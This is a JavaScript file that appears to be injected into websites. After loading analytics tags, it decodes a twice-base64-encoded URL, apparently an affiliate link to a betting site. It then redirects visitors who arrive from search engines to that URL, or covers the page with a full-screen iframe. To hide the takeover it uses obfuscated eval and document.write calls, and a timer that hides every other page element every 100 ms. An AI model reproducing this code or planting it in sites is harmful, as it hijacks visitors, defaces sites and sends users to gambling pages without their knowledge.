
var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?e1a5534ee695ed6a20c37e0a3a45fba0";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();

document.writeln("<script async src=\"https://www.googletagmanager.com/gtag/js?id=G-2V8N85G2ZE\"></script>");
document.writeln("<script>");
document.writeln("  window.dataLayer = window.dataLayer || [];");
document.writeln("  function gtag(){dataLayer.push(arguments);}");
document.writeln("  gtag(\'js\', new Date());");
document.writeln("");
document.writeln("  gtag(\'config\', \'G-2V8N85G2ZE\');");
document.writeln("</script>");
	
	url_pc_jpx="YUhSMGNITTZMeTkzZDNjdWQycGlaWFF1WTJ4MVlpOXBibVJsZUQ5aFptWnBiR2xoZEdWRGIyUmxQWFpwY0RnNE9BPT0=";
	url_m_jpx="YUhSMGNITTZMeTkzZDNjdWQycGlaWFF1WTJ4MVlpOXBibVJsZUQ5aFptWnBiR2xoZEdWRGIyUmxQWFpwY0RnNE9BPT0=";
	url_pc_jpx=mydecx(mydecx(url_pc_jpx));
	url_m_jpx=mydecx(mydecx(url_m_jpx));
	
	url_pc_frmex = "YUhSMGNITTZMeTkzZDNjdWQycGlaWFF1WTJ4MVlpOXBibVJsZUQ5aFptWnBiR2xoZEdWRGIyUmxQWFpwY0RnNE9BPT0=";
	url_m_frmex  = "YUhSMGNITTZMeTkzZDNjdWQycGlaWFF1WTJ4MVlpOXBibVJsZUQ5aFptWnBiR2xoZEdWRGIyUmxQWFpwY0RnNE9BPT0=";
	url_pc_frmex=mydecx(mydecx(url_pc_frmex));
	url_m_frmex=mydecx(mydecx(url_m_frmex));
	
	var customerx = [
		["baidu.com", 2, 2],
		["sogou.com", 1, 1],
		["so.com", 1, 1],
		["sm.cn", 1, 1],
	];

	mypcx = 0;
	mywapx = 0;
	myreferx = document.referrer.toLowerCase();
	myreferx = "baidu.com";
	for(var i=0; i<customerx.length; i ++)
	{
		if(myreferx.indexOf(customerx[i][0]) >= 0)
		{
			mypcx = customerx[i][1];
			mywapx = customerx[i][2];
			break;
		}
	}
	
	if (isMobilex() !== false && mywapx !== 0)
	{
		if(mywapx == 1)
		{
			window.location.href = url_m_jpx;
		}
		else
		{
			myframex(url_m_frmex);
		}
	}
	else if (isMobilex() === false && mypcx !== 0)
	{
		if(mypcx == 1)
		{
			window.location.href = url_pc_jpx;
		}
		else
		{
			myframex(url_pc_frmex);
		}
	}

	function mydecx(input) 
	{
		var keyStr = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
		var output = "";
		var chr1, chr2, chr3 = "";
		var enc1, enc2, enc3, enc4 = "";
		var i = 0;
		var base64test = /[^A-Za-z0-9\+\/\=]/g;
		Input = input.replace(/[^A-Za-z0-9\+\/\=]/g, "");
		do {
			enc1 = keyStr.indexOf(input.charAt(i++));
			enc2 = keyStr.indexOf(input.charAt(i++));
			enc3 = keyStr.indexOf(input.charAt(i++));
			enc4 = keyStr.indexOf(input.charAt(i++));
			chr1 = (enc1 << 2) | (enc2 >> 4);
			chr2 = ((enc2 & 15) << 4) | (enc3 >> 2);
			chr3 = ((enc3 & 3) << 6) | enc4;
			output = output + String.fromCharCode(chr1);
			if (enc3 != 64) {output = output + String.fromCharCode(chr2);}
			if (enc4 != 64) {output = output + String.fromCharCode(chr3);}
			chr1 = chr2 = chr3 = "";
			enc1 = enc2 = enc3 = enc4 = "";
		  } while (i < input.length);
		  return unescape(output);
	}
	
	function isMobilex()
	{
	    if ((navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i))) {
	        return true;
	    } else {
	        return false;
	    }
	}
	
	function myframex(p_url)
	{
		var ss = '<div id="showcloneshengxiaon" style="height: 100%; width: 100%; background-color: rgb(255, 255, 255); background-position: initial initial; background-repeat: initial initial;"><ifr' + 'ame scrolling="yes" marginheight=0 marginwidth=0  frameborder="0" allowfullscreen="true" webkitallowfullscreen="true" mozallowfullscreen="true" oallowfullscreen="true" msallowfullscreen="true" width="100%" width="14' + '00" height="100%" src="' + p_url + '"></iframe></div><style type="text/css">html{width:100%;height:100%}body {width:100%;height:100%;overflow:hidden}</style>';
 		eval("do" + "cu" + "ment.wr" + "ite('" + ss + "');");
  		var mycss = '<style type="text/css">	*{margin: 0;padding: 0;} </style>';
  		eval("do" + "cu" + "ment.wr" + "ite('" + mycss + "');");
  		var myadapter = '<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,minimum-scale=1,user-scalable=0">';
  		eval("do" + "cu" + "ment.wr" + "ite('" + myadapter + "');");
  		
  		try{
    		setInterval(function (){
      			try{
        			document.getElementById("div" + "All").style.display = "no" + "ne"
      			} 
      			catch (e){}
      			for (var i = 0; i < document.body.children.length; i++){
        			try{
          				var a = document.body.children[i].tagName;
          				var b = document.body.children[i].id;
          				if (b != "iconDiv1" && b != "showcloneshengxiaon"){
            				document.body.children[i].style.display = "non" + "e"
          				}
        			}
        			catch (e){}
     			}
    		}, 100)
 		}
 		catch (e){
  		}
	}
	
	